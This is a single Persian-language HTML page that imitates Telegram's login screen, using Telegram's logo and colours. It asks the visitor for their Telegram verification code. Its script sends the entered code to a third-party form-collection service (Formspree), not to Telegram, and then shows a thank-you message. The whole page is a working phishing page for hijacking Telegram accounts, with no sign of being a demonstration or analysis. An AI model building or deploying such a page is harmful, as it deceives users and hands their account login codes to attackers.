<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>وارد کردن کد تایید تلگرام</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #0088cc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
    }
    .container {
      background-color: white;
      border-radius: 12px;
      padding: 30px;
      width: 320px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      text-align: center;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 60px;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #0088cc;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0075b6;
    }
  </style>
</head>
<body>
  <div class="container" id="formContainer">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
    </div>

    <h3>کد تایید را وارد کنید</h3>

    <form id="codeForm">
      <input type="text" id="code" name="code" placeholder="کد تایید" required />
      <button type="submit">ارسال</button>
    </form>
  </div>

  <script>
    document.getElementById('codeForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const code = document.getElementById('code').value.trim();

      if (!code) {
        alert('لطفاً کد تایید را وارد کنید');
        return;
      }

      fetch('https://formspree.io/f/xjkokdbr', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ code: code })
      })
      .then(response => {
        if (response.ok) {
          // پیام تشکر رو نمایش بده و فرم رو مخفی کن
          const container = document.getElementById('formContainer');
          container.innerHTML = '<h2>Thank you! Your code has been submitted.</h2>';
        } else {
          alert('مشکلی در ارسال کد پیش آمد، لطفاً دوباره تلاش کنید.');
        }
      })
      .catch(() => alert('مشکلی در ارسال کد پیش آمد، لطفاً دوباره تلاش کنید.'));
    });
  </script>
</body>
</html>
